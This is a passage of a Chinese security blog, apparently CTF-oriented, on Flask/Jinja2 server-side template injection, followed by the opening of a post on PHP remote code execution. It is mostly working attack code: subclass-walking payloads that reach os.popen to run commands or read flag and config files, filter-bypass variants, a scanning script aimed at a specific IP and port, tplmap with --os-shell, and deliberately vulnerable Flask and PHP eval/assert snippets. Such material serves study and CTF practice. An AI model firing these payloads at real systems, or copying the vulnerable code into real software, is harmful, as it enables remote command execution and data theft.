class="keyword">class</span> <span class="string">&#x27;codecs.StreamReaderWriter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.StreamRecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abc._abc_data&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;abc.ABC&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Hashable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Awaitable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.AsyncIterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Callable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;os._AddedDllDirectory&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Helper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteCodec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteIncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteIncrementalDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteStreamReader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_multibytecodec.MultibyteStreamWriter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.DynamicClassAttribute&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types._GeneratorWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;importlib._abc.Loader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.accumulate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.filterfalse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.zip_longest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.pairwise&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._tee&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._tee_dataobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reprlib.Repr&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._deque_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_collections._tuplegetter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections._Link&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools._lru_cache_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.KeyWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools._lru_list_elem&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.partialmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.singledispatchmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;functools.cached_property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.ContextDecorator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib.AsyncContextDecorator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._GeneratorContextManagerBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;contextlib._BaseExitStack&#x27;</span>&gt;]</span><br></pre></td></tr></table></figure>

<p>__init__初始化类，然后globals全局来查找所有的的方法及变量参数</p>
<p>要找到这个类&lt;class ‘os._wrap_close’&gt; 所对应的序号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">198</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[i].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[i])</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__().index(os._wrap_close))</span><br></pre></td></tr></table></figure>



<p>这样的话就可以使用各种各样的方法比如popen</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).read()  <span class="comment">#这样就可以读取当前目录下的内容</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;flag.txt&#x27;</span>).read()   <span class="comment">#这样就实现了读取文件 </span></span><br></pre></td></tr></table></figure>

<h2 id="通过查找对应的函数模块或者类来进行构造"><a href="#通过查找对应的函数模块或者类来进行构造" class="headerlink" title="通过查找对应的函数模块或者类来进行构造"></a>通过查找对应的函数模块或者类来进行构造</h2><h3 id="查找eval函数"><a href="#查找eval函数" class="headerlink" title="查找eval函数"></a>查找eval函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://61.147.171.105:63900/&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os.py&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">       <span class="built_in">print</span>(i)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload:&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="查找os模块"><a href="#查找os模块" class="headerlink" title="查找os模块"></a>查找os模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://61.147.171.105:63900/&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os.py&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">       <span class="built_in">print</span>(i)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload:&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="查找importlib类"><a href="#查找importlib类" class="headerlink" title="查找importlib类"></a>查找importlib类</h3><p>Python 中存在 &lt;class ‘_frozen_importlib.BuiltinImporter’&gt; 类，目的就是提供 Python 中 import 语句的实现（以及 <strong>import</strong> 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。</p>
<p>也可以搜索__import__函数来导入os模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://61.147.171.105:63900/&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">       <span class="built_in">print</span>(i)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload:&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="类的总结"><a href="#类的总结" class="headerlink" title="类的总结"></a>类的总结</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each <span class="keyword">class</span> <span class="title class_">keeps</span> a <span class="built_in">list</span> of weak references to its immediate subclasses. This method returns a <span class="built_in">list</span> of <span class="built_in">all</span> those references still alive. The <span class="built_in">list</span> <span class="keyword">is</span> <span class="keyword">in</span> definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="string">&#x27;b&#x27;</span>]，就是a.__getitem__(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身如<span class="built_in">eval</span>()函数。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line"><span class="built_in">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取<span class="built_in">open</span>函数:request.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-<span class="type">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-<span class="type">Type</span>:a/b)</span><br><span class="line">request.json		 post传json  (Content-<span class="type">Type</span>: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of <span class="string">&#x27;flask_ssti&#x27;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤[]</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">138</span>).__init__.__globals__.get(<span class="string">&#x27;popen&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="利用config读取flag"><a href="#利用config读取flag" class="headerlink" title="利用config读取flag"></a>利用config读取flag</h3><p>如果flag是利用app.config[‘flag’]&#x3D;’*******’ 进行配置的</p>
<p>则可以利用来读取</p>
<p>或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;self.<span class="built_in">dict</span>.__TemplateReference__context.config&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[<span class="string">&#x27;json&#x27;</span>].JSONEncoder.default.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单的ssti漏洞代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    app.config[<span class="string">&#x27;flag&#x27;</span>] = <span class="string">&#x27;sdhgfdfsdhfjsgfs&#x27;</span></span><br><span class="line">    templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Title&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">        &#123;&#125;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(request.args.get(<span class="string">&#x27;key&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(templates)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>



<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>使用括号进行绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).read()&#125;&#125; </span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__.get(request.args.func)(request.args.cmd).read()&#125;&#125;&amp;func=popen&amp;cmd=<span class="built_in">dir</span></span><br></pre></td></tr></table></figure>

<h3 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__getattribute__(<span class="string">&#x27;__&#x27;</span>+<span class="string">&quot;cl&quot;</span>+<span class="string">&quot;ass&quot;</span>+<span class="string">&#x27;__&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="TPLMAP的使用"><a href="#TPLMAP的使用" class="headerlink" title="TPLMAP的使用"></a>TPLMAP的使用</h2><p>下载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/epinna/tplmap.git</span><br></pre></td></tr></table></figure>

<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tplmap.py -u &quot;url/?key=111*&quot;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取shell</span></span><br><span class="line">python2 tplmap.py -u url?flag --os-shell</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看目录</span></span><br><span class="line">ls</span><br><span class="line"></span><br><span class="line"><span class="comment">#发现flag文件，打开</span></span><br><span class="line">cat flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-RCE"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/15/RCE/"
    >RCE</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/15/RCE/" class="article-date">
  <time datetime="2023-03-15T11:49:36.000Z" itemprop="datePublished">2023-03-15</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/RCE/">RCE</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="代码执行的相关函数"><a href="#代码执行的相关函数" class="headerlink" title="代码执行的相关函数"></a>代码执行的相关函数</h2><p>eval函数会把函数内的语句当作php代码执行但是 语句后面需要分号</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?cmd=phpinfo();</span></span><br></pre></td></tr></table></figure>

<p>assert与eval功能相似 但是兼容性更强  后面加不加分号都可以</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">assert</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//?cmd=phpinfo();</span></span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br></pre></td></tr></table></figure>

<p>安全防御：加引号</p>
